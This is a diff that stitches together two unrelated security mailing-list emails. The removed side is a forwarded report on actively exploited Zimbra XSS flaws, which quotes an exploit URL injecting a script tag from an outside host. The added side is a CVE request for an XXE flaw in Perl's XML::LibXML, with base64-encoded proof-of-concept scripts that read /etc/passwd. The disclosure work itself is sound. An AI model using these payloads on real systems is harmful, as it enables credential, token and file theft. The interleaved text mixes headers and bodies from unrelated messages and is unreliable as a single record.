@@ -1,4 +1,9 @@
-Received: (qmail 1714 invoked by uid 550); 17 Nov 2023 13:39:36 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4970" "Friday" "24" "April" "2015" "20:40:37" "+0000" "Tilmann Haak" "tilmann.haak@xing.com" "<8BB9CA6B6B0D854E91889283C9B54C75DAF38EAB@xing-exchsvr04.xing.hh>" "116" "[oss-security] CVE request: Perl XML::LibXML" nil nil nil "4" "2015042420:40:37" "[oss-security] CVE request: Perl XML::LibXML" (number mark "        tilmann.haak Apr 24  116/4970  " thread-indent "\"[oss-security] CVE request: Perl XML::LibXML\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 15959 invoked by uid 550); 25 Apr 2015 01:32:00 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,91 +11,146 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 26423 invoked from network); 17 Nov 2023 12:12:19 -0000
-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=notcom.org;
-	s=jk; h=Content-Type:MIME-Version:Message-ID:Subject:To:From:Date:Sender:
-	Reply-To:Cc:Content-Transfer-Encoding:Content-ID:Content-Description:
-	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
-	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
-	List-Post:List-Owner:List-Archive;
-	bh=/e8rp49epyMkR//L5abfFlAX6jCu86odiVczx2R3JdY=; t=1700223139; x=1701087139; 
-	b=ZjFHAsOFA3NzBleiXj5KSP+N9xLuI1OWNRJonX4KJb7W6jdckdDeGQWHqOO4TfeCp5OWSzv8y3e
-	PWjYX3NKWTSICu+qIXcyaWxlDNUszOZf+eY4iiPqIEndzx019px4PXAQVKq8O0VSdhliS82EzthuV
-	av8S0ZfWEX5JzUbDCi5jz/sXaGwboFg8rqddOdEv+/2hql36jH3t3yUujn0mDLFnWjaOrQM92lVem
-	lyxUXdfRmviwkMFJhEdVCrp0/0qDY6oMEdP2ZGbfKm+NCz23Z2xoWGDiYe1azOPOdOgIoRxaYbsbK
-	z2PUSg1Uijpsv3eKqPK+eEPZwG6b7Dqqn9Ww==;
-Date: Fri, 17 Nov 2023 14:11:59 +0200
-From: Valtteri Vuorikoski <vuori@notcom.org>
-To: oss-security@lists.openwall.com
-Message-ID: <4nksyq7teu5vpqkx5tzlmpi6pqimagq3jdby3u4g3e5lzqodij@noxitrjl7ffb>
-Mail-Followup-To: oss-security@lists.openwall.com
+Received: (qmail 21987 invoked from network); 24 Apr 2015 20:40:50 -0000
+DKIM-Signature: v=1; a=rsa-sha256; d=xing.com; s=main; c=relaxed/simple;
+	q=dns/txt; i=@xing.com; t=1429908039;
+	h=From:Subject:Date:To:MIME-Version:Content-Type;
+	bh=bD94L854Ztg+0g/RMSypkaJ0COvqhzwKLiTbL3x8WW8=;
+	b=cxxMPqPeOtcSw3c1aMZfPdLmI6HDGCIYIr0lqwTW9d52nPiM21A/yOrqjDQrDAhe
+	fkFvt3pNMVvG/EHLmQfdjCE49Dvh5d95Vpeml1cy9SEqhC2Ur2K0vg4cOJ4MHcnb
+	PY8EPbEyLZfZD5T7r6divny5X7vI6THeGpQeWsnjgJc=;
+X-MSFBL: b3NzLXNlY3VyaXR5QGxpc3RzLm9wZW53YWxsLmNvbUBtYWlsb3V0Mi0xMjBAbWFp
+	bG91dDIteGluZy11bmNlcnRpZmllZEA=
+Thread-Topic: CVE request: Perl XML::LibXML
+Thread-Index: AdB+zsQh7bwrWWQ+Tr+8++wgagm0Bw==
+Message-ID: <8BB9CA6B6B0D854E91889283C9B54C75DAF38EAB@xing-exchsvr04.xing.hh>
+Accept-Language: de-DE, en-US
+Content-Language: de-DE
+X-MS-Has-Attach: yes
+X-MS-TNEF-Correlator:
+x-originating-ip: [82.112.107.70]
+Content-Type: multipart/mixed;
+	boundary="_003_8BB9CA6B6B0D854E91889283C9B54C75DAF38EABxingexchsvr04xi_"
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-User-Agent: NeoMutt/20231006-6-ca2e93
-Subject: [oss-security] CVE-2023-37580 (and others): XSS vulnerabilities in Zimbra
- Collaboration Suite
+Date: Fri, 24 Apr 2015 20:40:37 +0000
+From: Tilmann Haak <tilmann.haak@xing.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] CVE request: Perl XML::LibXML
+To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
 
-Not associated with Zimbra/TAG, just forwarding this.
+--_003_8BB9CA6B6B0D854E91889283C9B54C75DAF38EABxingexchsvr04xi_
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
 
-The Zimbra Collaboration Suite is a groupware suite that includes a
-webmail client. While the current main offering is a paid product, an
-open-source version is available on Zimbra's Github.
+Hi oss-sec,
 
-There appear to be multiple recent vulnerabilities in the suite that
-allow Javascript code to be injected into pages running in
-authenticated contexts that affect the 8.8.x, 9.0.x and/or 10.0.x
-release trains.
+I'd like to request a CVE number for an XEE vulnerability in Perl's XML::Li=
+bXML.
 
-Google TAG has published an analysis of CVE-2023-37580 at
-<https://blog.google/threat-analysis-group/zimbra-0-day-used-to-target-international-government-organizations/>:
+According to XML::LibXML's documentation it should be possible to
+disable processing of external entities by using the "expand_entities" para=
+meter.
 
-  [T]here was a vulnerability in Zimbra that injected the parameter
-  within the URL directly into the webpage, causing the script to
-  be executed. An example that could trigger the XSS is:
+Two example scripts are attached to this mail. The=20
+output of XEE-XML-LibXML-demo.pl should not contain external=20
+entities, but "expand_entities" is ignored. The output=20
+of XEE-XML-LibXML-demo2.pl is as expected (no external entities).
 
-    https://mail.REDACTED[.]com/m/momovetost=acg%22%2F%3E%3Cscript%20src%3D%22https%3A%2F%2Fobsorth%2Eopwtjnpoc%2Eml%2FpQyMSCXWyBWJpIos%2Ejs%22%3E%3C%2Fscript%3E%2F%2F
+The behaviour depends on how the XML is loaded.
+Using "$XML_DOC =3D XML::LibXML->load_xml" works as documented, using=20
+$parser =3D XML::LibXML->new and $XML_DOC =3D $parser->load_xml does not.
 
-  which decodes to:
+I've tested the issue on two platforms and was able to print out the=20
+system's "/etc/passwd" file.
 
-    https://mail.REDACTED[.]com/m/momoveto?st=acg"/><script src="https://REDACTED/script.js"></script>//
 
-  The fix was to escape the contents of the st parameter before it was
-  set as the value in an html object.
+Ubuntu 12.04.5 LTS
+Perl version: v5.14.2
+libxml2 version: 2.7.8
+XML::LibXML version: 1.89
 
-According to TAG, the vulnerability is being actively exploited to
-"steal email data, user credentials, and authentication tokens". It
-appears that at least some of the same threat actors that were using
-the recent Roundcube webmail exploit (CVE-2023-5631) to target
-European government users have also been exploiting this vulnerability
-against similar targets. However, unlike the Roundcube vulnerability,
-CVE-2023-37580 is not "zero-click" in the sense that simply opening an
-e-mail message is enough to trigger the exploit.
+Mac OS X 10.9.5
+Perl version: v5.16.2
+libxml2 version: 2.9.0
+XML::LibXML version: 2.0118
 
-Independent of the TAG report, the Zimbra security advisory page
-<https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories> lists at
-least three other recent XSS vulnerabilities that based on the brief
-description and recent Github commits may provide alternative
-avenues for similar exploits: CVE-2023-43102, CVE-2023-41106 and
-CVE-2023-43103.
 
-As Zimbra no longer provides packaged versions of the suite's
-open-source version, users must manually update their installations
-from the upstream repository or rely on third-party-provided
-packages/container images. Based on the advisory page, the tagged
-releases 8.8.15p44, 9.0.0p37 and 10.0.5 should include patches for all
-of the above.
+The vulnerability is fixed in version 2.0119.
+I'm not sure which older versions are affected, however the vulnerability i=
+s present in version 1.89 and probably older versions, too.
 
-The official "advisories" are quite uninformative, but the
-following commits appear related to the above CVEs:
+The fix:
+<https://bitbucket.org/shlomif/perl-xml-libxml/commits/5962fd067580767777e9=
+4640b129ae8930a68a30>
 
-CVE-2023-37580: https://github.com/Zimbra/zm-web-client/commit/874ac8c158532a057b9857c21e1e03853b77ee6b
-CVE-2023-43103: https://github.com/Zimbra/zm-web-client/commit/834eaf4b5eac8ed5cca9a994f9f031aa8d50d34a
+Changelog:
+<http://cpansearch.perl.org/src/SHLOMIF/XML-LibXML-2.0119/Changes>
 
-File removal commit
-<https://github.com/Zimbra/zm-web-client/commit/ef57b9ad60d4530a9659d9585c5d44eeb72b6cd9>
-may be related to one (or more) of the other CVEs.
+I'm not aware of other CVE requests.
 
- -Valtteri
- 
+
+Thanks in advance,
+  Tilmann Haak
+
+--_003_8BB9CA6B6B0D854E91889283C9B54C75DAF38EABxingexchsvr04xi_
+Content-Type: application/octet-stream; name="XEE-XML-LibXML-demo.pl"
+Content-Description: XEE-XML-LibXML-demo.pl
+Content-Disposition: attachment; filename="XEE-XML-LibXML-demo.pl"; size=948;
+	creation-date="Fri, 24 Apr 2015 20:39:31 GMT";
+	modification-date="Fri, 24 Apr 2015 20:39:31 GMT"
+Content-Transfer-Encoding: base64
+
+IyEvdXNyL2Jpbi9wZXJsCnVzZSBzdHJpY3Q7CnVzZSB3YXJuaW5nczsKdXNl
+IFhNTDo6TGliWE1MOwoKbXkgJFhNTCA9IDw8IkVPVCI7Cjw/eG1sIHZlcnNp
+b249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+CjwhRE9DVFlQRSB0aXRsZSBb
+IDwhRUxFTUVOVCB0aXRsZSBBTlkgPgo8IUVOVElUWSB4eGUgU1lTVEVNICJm
+aWxlOi8vL2V0Yy9wYXNzd2QiID5dPgo8cnNzIHZlcnNpb249IjIuMCIgeG1s
+bnM6YXRvbT0iaHR0cDovL3d3dy53My5vcmcvMjAwNS9BdG9tIj4KPGNoYW5u
+ZWw+CiAgICA8dGl0bGU+WFhFPC90aXRsZT4KICAgIDxsaW5rPmV4YW1wbGUu
+Y29tPC9saW5rPgogICAgPGRlc2NyaXB0aW9uPlhYRTwvZGVzY3JpcHRpb24+
+CiAgICA8aXRlbT4KICAgICAgICA8dGl0bGU+Jnh4ZTs8L3RpdGxlPgogICAg
+ICAgIDxsaW5rPmV4YW1wbGUuY29tPC9saW5rPgogICAgICAgIDxkZXNjcmlw
+dGlvbj5YWEUgaGVyZTwvZGVzY3JpcHRpb24+CiAgICA8L2l0ZW0+CjwvY2hh
+bm5lbD4KPC9yc3M+CkVPVAoKbXkgJHBhcnNlciA9IFhNTDo6TGliWE1MLT5u
+ZXcoCiAgICBleHBhbmRfZW50aXRpZXMgPT4gMCwKICAgIGxvYWRfZXh0X2R0
+ZCAgICA9PiAwLAogICAgbm9fbmV0d29yayAgICAgID0+IDEsCiAgICBleHBh
+bmRfeGluY2x1ZGUgPT4gMCwKKTsKbXkgJFhNTF9ET0MgPSAkcGFyc2VyLT5s
+b2FkX3htbCggc3RyaW5nID0+ICRYTUwsICk7CgpwcmludCAiKioqXG4iOwpw
+cmludCAiUGVybCB2ZXJzaW9uOiAiIC4gJF5WIC4gIlxuIjsKcHJpbnQgImxp
+YnhtbDIgdmVyc2lvbjogIiAuIFhNTDo6TGliWE1MOjpMSUJYTUxfRE9UVEVE
+X1ZFUlNJT04gLiAiXG4iOwpwcmludCAiWE1MOjpMaWJYTUwgdmVyc2lvbjog
+IiAuICRYTUw6OkxpYlhNTDo6VkVSU0lPTiAuICJcbiI7CnByaW50ICIqKipc
+biI7CnByaW50ICRYTUxfRE9DLT50b1N0cmluZygpOwpwcmludCAiKioqXG4i
+OwoK
+
+--_003_8BB9CA6B6B0D854E91889283C9B54C75DAF38EABxingexchsvr04xi_
+Content-Type: application/octet-stream; name="XEE-XML-LibXML-demo2.pl"
+Content-Description: XEE-XML-LibXML-demo2.pl
+Content-Disposition: attachment; filename="XEE-XML-LibXML-demo2.pl"; size=930;
+	creation-date="Fri, 24 Apr 2015 20:39:31 GMT";
+	modification-date="Fri, 24 Apr 2015 20:39:31 GMT"
+Content-Transfer-Encoding: base64
+
+IyEvdXNyL2Jpbi9wZXJsCnVzZSBzdHJpY3Q7CnVzZSB3YXJuaW5nczsKdXNl
+IFhNTDo6TGliWE1MOwoKbXkgJFhNTCA9IDw8IkVPVCI7Cjw/eG1sIHZlcnNp
+b249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+CjwhRE9DVFlQRSB0aXRsZSBb
+IDwhRUxFTUVOVCB0aXRsZSBBTlkgPgo8IUVOVElUWSB4eGUgU1lTVEVNICJm
+aWxlOi8vL2V0Yy9wYXNzd2QiID5dPgo8cnNzIHZlcnNpb249IjIuMCIgeG1s
+bnM6YXRvbT0iaHR0cDovL3d3dy53My5vcmcvMjAwNS9BdG9tIj4KPGNoYW5u
+ZWw+CiAgICA8dGl0bGU+WFhFPC90aXRsZT4KICAgIDxsaW5rPmV4YW1wbGUu
+Y29tPC9saW5rPgogICAgPGRlc2NyaXB0aW9uPlhYRTwvZGVzY3JpcHRpb24+
+CiAgICA8aXRlbT4KICAgICAgICA8dGl0bGU+Jnh4ZTs8L3RpdGxlPgogICAg
+ICAgIDxsaW5rPmV4YW1wbGUuY29tPC9saW5rPgogICAgICAgIDxkZXNjcmlw
+dGlvbj5YWEUgaGVyZTwvZGVzY3JpcHRpb24+CiAgICA8L2l0ZW0+CjwvY2hh
+bm5lbD4KPC9yc3M+CkVPVAoKbXkgJFhNTF9ET0MgPSBYTUw6OkxpYlhNTC0+
+bG9hZF94bWwoCiAgICBzdHJpbmcgICAgICAgICAgPT4gJFhNTCwKICAgIGV4
+cGFuZF9lbnRpdGllcyA9PiAwLAogICAgbG9hZF9leHRfZHRkICAgID0+IDAs
+CiAgICBub19uZXR3b3JrICAgICAgPT4gMSwKICAgIGV4cGFuZF94aW5jbHVk
+ZSA9PiAwLAopOwoKcHJpbnQgIioqKlxuIjsKcHJpbnQgIlBlcmwgdmVyc2lv
+bjogIiAuICReViAuICJcbiI7CnByaW50ICJsaWJ4bWwyIHZlcnNpb246ICIg
+LiBYTUw6OkxpYlhNTDo6TElCWE1MX0RPVFRFRF9WRVJTSU9OIC4gIlxuIjsK
+cHJpbnQgIlhNTDo6TGliWE1MIHZlcnNpb246ICIgLiAkWE1MOjpMaWJYTUw6
+OlZFUlNJT04gLiAiXG4iOwpwcmludCAiKioqXG4iOwpwcmludCAkWE1MX0RP
+Qy0+dG9TdHJpbmcoKTsKcHJpbnQgIioqKlxuIjsK
+
+--_003_8BB9CA6B6B0D854E91889283C9B54C75DAF38EABxingexchsvr04xi_--
